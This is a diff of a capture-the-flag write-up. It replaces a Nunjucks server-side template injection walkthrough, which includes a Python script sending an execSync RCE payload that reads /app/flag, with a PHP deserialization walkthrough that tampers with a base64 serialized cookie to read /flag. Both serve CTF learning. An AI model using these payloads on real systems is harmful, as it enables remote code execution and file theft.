@@ -1,44 +1,33 @@
-# SunSet introspecTIon
+# Penguim - (De)Serial Killer
 
 Challenge Description:
 
-> Watching the sunset with nunjucks to make sure your server side is always protected. The flag is on /app/flag.
+> Mr Penguim published a website where you can create an account and acess your profile, but be careful because the path to his profile picture is always staring at you.
 
 ## Analyzing the website
 
-Accessing the website gives us a input field for giving our username which just echoes it back to us when we submit it.
+We are able to register a account and login with it as well.
 
-![echo username](username.PNG)
+![login](login.PNG)
 
-According to the description,the server seems to be using the nunjucks templating engine which can be exploitable for SSTI because of unsanitized user input(the username).
+A cookie named user is also set when we login.It seems like it url encoded because of the %3D at the end of the string and it is also base64 encoded.
 
-We can try to get a proof of concept by using the below command:
+`User : Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjU6InVzZXIxIjtzOjEyOiJwaWN0dXJlX3BhdGgiO3M6MzE6Ii92YXIvd3d3L2h0bWwvYXZhdGFyL2F2YXRhci5qcGciO3M6MTE6InByb2ZpbGVfcGljIjtOO30%3D`
 
-command used --> `{{7*7}}`
+We decode it and we see that it is a php serialized object.
+
+![base64_decode](base64_decode.PNG)
+
+The picture_path attribute seems intresting because the home page of the user had a picture which might be getting loaded from this path.
+
+Hence,we can try changing this to the flag's path and try loading it.
+
+Modified cookie: `O:4:"User":3:{s:8:"username";s:5:"user1";s:12:"picture_path";s:5:"/flag";s:11:"profile_pic";N;}`
+
+We encode this using base64 and convert the last '=' to %3D and replace the original cookie.
 
 ![poc1](poc1.PNG)
 
-We see that the field is injectable because we get the output back as 49.
+We see the source and there is some base64 encoded content being loaded from that path we gave.We decode it and get the flag.
 
-![poc2](poc2.PNG)
-
-The below link provides a way for getting RCE by breaking out of the template engine's syntax.We try calling child_process using the templating engine's callables(range,cycler).From there we can call execsync to execute commands.
-[nunjucks rce](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine)
-
-We can automate it by the below script which uses the GET paramters to send the payload and get the output.
-
-```python
-import requests
-from bs4 import BeautifulSoup
-
-payload = "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('cat /app/flag')\")()}}"
-url = f"http://cybersecweek.ua.pt:2003/display?payload={payload}"
-
-r = requests.get(url)
-soup = BeautifulSoup(r.text, 'html.parser')
-
-output = str(soup.find_all('h1')[0]).replace('<h1>','').replace('</h1>','')
-print(output)
-```
-
-![flag output](script_output.PNG)
+flag --> `CTFUA{pHp_uns3r1aliZe_k1ng}`
